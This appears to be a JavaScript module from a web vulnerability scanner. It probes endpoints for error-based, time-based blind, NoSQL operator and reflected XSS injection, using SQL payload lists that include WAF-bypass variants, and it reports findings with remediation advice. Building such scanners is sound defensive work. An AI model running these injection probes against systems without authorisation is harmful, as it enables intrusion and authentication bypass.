/**
 * Active vulnerability testing: SQL injection, time-based blind SQLi,
 * NoSQL injection, and XSS reflection.
 *
 * Techniques covered:
 *   Error-based SQLi    — triggers a visible database error message
 *   Boolean-based SQLi  — page content differs between true/false conditions
 *   UNION-based SQLi    — append a UNION SELECT to leak columns
 *   WAF bypass SQLi     — comment insertion, case mixing, URL encoding
 *   Time-based blind    — SLEEP/WAITFOR causes a measurable server delay
 *   NoSQL injection     — MongoDB operator injection via URL parameters
 *   Reflected XSS       — unsanitised input echoed back in response body
 *
 * Only use on systems you own or have explicit written permission to test.
 */

// ── SQL Injection payloads ────────────────────────────────────────────────────

const SQLI_PAYLOADS = [
  // ── Basic syntax-breaking ────────────────────────────
  "'",                             // Single quote — breaks most string contexts
  "''",                            // Double single-quote — escape-test
  "`",                             // MySQL backtick delimiter
  '"',                             // Double-quote delimiter

  // ── Boolean-based ────────────────────────────────────
  "1' OR '1'='1",                  // Classic always-true condition
  "1' OR 1=1--",                   // Always-true with SQL comment
  "' OR 'x'='x",                   // Alternate form
  "1 AND 1=1",                     // True condition (no quotes needed)
  "1 AND 1=2",                     // False — page should differ vs AND 1=1

  // ── UNION-based (column-count probing) ───────────────
  "1 UNION SELECT NULL--",
  "1 UNION SELECT NULL,NULL--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "1 UNION ALL SELECT NULL,NULL--",

  // ── WAF / filter bypass ──────────────────────────────
  "1'/**/OR/**/'1'='1",            // Comment-based space bypass
  "1' OR 1=1#",                    // MySQL hash-comment bypass
  "1' OR 1=1/*",                   // Block-comment bypass
  "1' oR '1'='1",                  // Case-mixing bypass
  "%271%27%20OR%20%271%27%3D%271", // URL-encoded bypass

  // ── Stacked / batch queries ──────────────────────────
  "1'; SELECT 1--",                // Stacked query (MSSQL, PostgreSQL)
  "1; SELECT SLEEP(0)--",          // Stacked (check for execution without delay)
];

// Time-based payloads are tested separately with timing measurement
const SQLI_TIME_PAYLOADS = [
  { db: 'MySQL',      payload: "1' AND SLEEP(3)--" },
  { db: 'MSSQL',      payload: "1'; WAITFOR DELAY '0:0:3'--" },
  { db: 'PostgreSQL', payload: "1'||pg_sleep(3)--" },
  { db: 'Oracle',     payload: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS$',3)--" },
];

// ── Error signatures across 10 databases and ORMs ────────────────────────────

const SQLI_SIGNATURES = [
  // ── MySQL / MariaDB ──────────────────────────────────
  /you have an error in your sql syntax/i,
  /warning:\s*mysql/i,
  /mysql_fetch_/i,
  /supplied argument is not a valid mysql/i,
  /root@localhost/i,
  /mysql\.connector\.errors/i,

  // ── PostgreSQL ───────────────────────────────────────
  /pg_query\(\)/i,
  /warning:\s*pg_/i,
  /valid PostgreSQL result/i,
  /syntax error at or near/i,
  /unterminated string literal/i,
  /org\.postgresql\.util\.PSQLException/i,

  // ── MSSQL / SQL Server ───────────────────────────────
  /microsoft ole db provider for sql server/i,
  /incorrect syntax near/i,
  /unclosed quotation mark after the character string/i,
  /\.net sqlclient data provider/i,
  /\[Microsoft\]\[ODBC/i,
  /microsoft sql native client/i,
  /sqlserver.*exception/i,

  // ── Oracle ───────────────────────────────────────────
  /ora-\d{4,5}:/i,
  /oracle.*driver/i,
  /quoted string not properly terminated/i,
  /ORA-01756/i,

  // ── SQLite ───────────────────────────────────────────
  /sqlite\/jdbcdriver/i,
  /sqlite\.exception/i,
  /system\.data\.sqlite\.sqliteexception/i,
  /near ".*": syntax error/i,
  /unrecognized token:/i,

  // ── DB2 ──────────────────────────────────────────────
  /db2 sql error\s*:/i,
  /com\.ibm\.db2/i,

  // ── PHP PDO / generic ────────────────────────────────
  /PDOException.*SQLSTATE/i,
  /SQLSTATE\[\w+\].*SQL/i,
  /Fatal error.*SQL/i,
  /warning:\s*odbc/i,

  // ── ORM / framework errors ───────────────────────────
  // Django
  /ProgrammingError at\s+\//i,
  /OperationalError at\s+\//i,
  /django\.db\.utils\.(Operational|Programming)Error/i,

  // Laravel / Eloquent
  /Illuminate\\Database\\QueryException/i,
  /SQLSTATE\[.*\].*Illuminate/i,

  // Ruby on Rails / ActiveRecord
  /ActiveRecord::StatementInvalid/i,
  /PG::SyntaxError:/i,

  // Hibernate / Spring
  /org\.hibernate\.exception/i,
  /could not extract ResultSet/i,
  /org\.springframework\.dao/i,

  // Sequelize (Node.js)
  /SequelizeDatabaseError/i,
  /SequelizeUniqueConstraintError/i,

  // Doctrine (PHP)
  /Doctrine\\DBAL\\Exception/i,
  /Doctrine\\ORM\\ORMException/i,
];

// ── NoSQL (MongoDB) injection signatures ─────────────────────────────────────

// URL-parameter-style NoSQL operator injections
const NOSQL_PARAMS = [
  ['[$ne]', '1'],       // Not-equal: matches anything != 1
  ['[$gt]', ''],        // Greater-than: matches any non-empty string
  ['[$regex]', '.*'],   // Regex: matches everything
  ['[$where]', '1==1'], // Where clause: always true
];

const NOSQL_SUCCESS_HINTS = [
  // If the server returns more records than the baseline request, it's likely injectable
  // We check for typical authentication bypass messages
  /welcome|dashboard|logged.?in|success|authenticated/i,
];

// ── XSS Reflection ────────────────────────────────────────────────────────────

const XSS_MARKER = 'xss7331test';

const XSS_PAYLOADS = [
  `<${XSS_MARKER}>`,               // Basic tag injection
  `"><${XSS_MARKER}>`,             // Attribute escape + injection
  `'><${XSS_MARKER}>`,             // Single-quote escape + injection
  `javascript:/*--><${XSS_MARKER}>`, // Protocol-based
];

// ── Shared helpers ────────────────────────────────────────────────────────────

async function tryFetch(url, timeoutMs) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      signal: controller.signal,
      mode: 'cors',
      credentials: 'omit',
    });
    clearTimeout(timer);
    let body = '';
    try { body = await res.text(); } catch { /* CORS opaque response */ }
    return { ok: true, body, status: res.status };
  } catch {
    clearTimeout(timer);
    return { ok: false, body: '', status: null };
  }
}

function injectParam(endpoint, key, value) {
  const u = new URL(endpoint);
  const params = [...u.searchParams.entries()];
  if (params.length > 0) {
    u.searchParams.set(params[0][0], value);
  } else {
    u.searchParams.set(key, value);
  }
  return u.href;
}

// ── Error-based SQL Injection ─────────────────────────────────────────────────

/**
 * Test endpoints for error-based SQL injection.
 * Sends payloads that break SQL syntax and checks the response for
 * database error messages from MySQL, PostgreSQL, MSSQL, Oracle, SQLite,
 * DB2, PDO, and major ORMs (Django, Laravel, Rails, Hibernate, Sequelize).
 *
 * @param {string[]} endpoints
 * @param {number} timeoutMs
 * @returns {Promise<Array>}
 */
export async function testSqliEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of SQLI_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'id', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      for (const sig of SQLI_SIGNATURES) {
        if (sig.test(body)) {
          done.add(basePath);
          results.push({
            id: `sqli-err-${results.length}`,
            name: 'SQL Injection — Error-Based',
            category: 'Injection',
            severity: 'critical',
            sqliTechnique: 'error-based',
            description: `Payload "${payload}" caused the server to return a database error message. The backend is concatenating user input directly into a SQL query without sanitisation.`,
            guidance: 'Use parameterised queries / prepared statements in every database call. Never build SQL strings by concatenating user input.',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      }
      if (done.has(basePath)) break;
    }
  }

  return results;
}

// ── Time-Based Blind SQL Injection ───────────────────────────────────────────

/**
 * Test endpoints for time-based blind SQL injection.
 * Measures a baseline response time, then sends SLEEP/WAITFOR payloads.
 * If the response takes ≥ 2.5 s longer than baseline, the delay executed.
 *
 * @param {string[]} endpoints - Only endpoints not already found by error-based
 * @param {number} timeoutMs
 * @returns {Promise<Array>}
 */
export async function testSqliTimeBased(endpoints, timeoutMs = 10000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 6)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    // Measure baseline with a neutral param
    let baselineMs = 2000; // conservative default
    try {
      const t0 = Date.now();
      await tryFetch(injectParam(endpoint, 'id', '1'), 3000);
      baselineMs = Date.now() - t0;
    } catch { /* ignore */ }

    for (const { db, payload } of SQLI_TIME_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'id', payload); } catch { continue; }

      const t0 = Date.now();
      const { ok } = await tryFetch(testUrl, timeoutMs);
      const elapsed = Date.now() - t0;

      // Flag if the response took at least 2.5 s longer than baseline
      if (ok && elapsed >= baselineMs + 2500) {
        done.add(basePath);
        results.push({
          id: `sqli-time-${results.length}`,
          name: 'SQL Injection — Time-Based Blind',
          category: 'Injection',
          severity: 'critical',
          sqliTechnique: 'time-based-blind',
          description: `${db} time-delay payload "${payload}" caused a ${(elapsed / 1000).toFixed(1)} s response (baseline: ${(baselineMs / 1000).toFixed(1)} s). The server executed the injected SLEEP/WAITFOR, confirming SQL injection even without visible errors.`,
          guidance: 'Use parameterised queries / prepared statements. This blind variant is especially dangerous because it is harder to detect with WAFs and logging.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }

  return results;
}

// ── NoSQL Injection ───────────────────────────────────────────────────────────

/**
 * Test endpoints for MongoDB-style NoSQL injection via URL query parameters.
 * Sends operator payloads like ?field[$ne]=1 which bypass equality checks.
 *
 * @param {string[]} endpoints
 * @param {number} timeoutMs
 * @returns {Promise<Array>}
 */
export async function testNoSqlEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath, baselineStatus;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    // Get baseline (normal request)
    const { status: s0, body: b0 } = await tryFetch(endpoint, timeoutMs);
    baselineStatus = s0;

    for (const [opKey, opVal] of NOSQL_PARAMS) {
      let testUrl;
      try {
        const u = new URL(endpoint);
        const params = [...u.searchParams.entries()];
        if (params.length > 0) {
          // Replace first param key with key[$op] form
          u.searchParams.delete(params[0][0]);
          u.searchParams.set(`${params[0][0]}${opKey}`, opVal);
        } else {
          u.searchParams.set(`username${opKey}`, opVal);
        }
        testUrl = u.href;
      } catch { continue; }

      const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      // Heuristic: if baseline was 401/403/404 and operator returns 200 → bypass
      const possibleBypass =
        (baselineStatus === 401 || baselineStatus === 403 || baselineStatus === 404) &&
        status === 200;

      // Or success keywords appeared that weren't in baseline
      const successKeyword =
        NOSQL_SUCCESS_HINTS.some((re) => re.test(body) && !re.test(b0 ?? ''));

      if (possibleBypass || successKeyword) {
        done.add(basePath);
        results.push({
          id: `nosql-${results.length}`,
          name: 'NoSQL Injection (MongoDB Operator)',
          category: 'Injection',
          severity: 'critical',
          description: `The operator parameter "${opKey}=${opVal}" changed the server response from HTTP ${baselineStatus} to HTTP ${status}${successKeyword ? ' and returned authentication success keywords' : ''}. The backend likely passes URL parameters directly into a MongoDB query without validation.`,
          guidance: 'Validate and whitelist all input before passing to database queries. Use schema validation (e.g., Joi, Zod) and avoid constructing query filters from raw request data.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }

  return results;
}

// ── XSS Reflection ────────────────────────────────────────────────────────────

/**
 * Test endpoints for reflected XSS by injecting a unique marker string
 * into query parameters and checking if it appears unescaped in the response.
 *
 * @param {string[]} endpoints
 * @param {number} timeoutMs
 * @returns {Promise<Array>}
 */
export async function testXssEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of XSS_PAYLOADS) {
      let testUrl;
      try {
        const u = new URL(endpoint);
        const params = [...u.searchParams.entries()];
        if (params.length > 0) {
          u.searchParams.set(params[0][0], payload);
        } else {
          u.searchParams.set('q', payload);
        }
        testUrl = u.href;
      } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      if (body.includes(XSS_MARKER)) {
        done.add(basePath);
        results.push({
          id: `xss-${results.length}`,
          name: 'Reflected XSS',
          category: 'Injection',
          severity: 'high',
          description: `The test payload "${payload}" was reflected back unescaped in the server response. An attacker can craft a malicious URL that, when clicked by a victim, executes arbitrary JavaScript in their browser.`,
          guidance: 'Escape all user-supplied data before inserting it into HTML output (use textContent, not innerHTML). Implement a strict Content-Security-Policy as a defence-in-depth layer.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }

  return results;
}
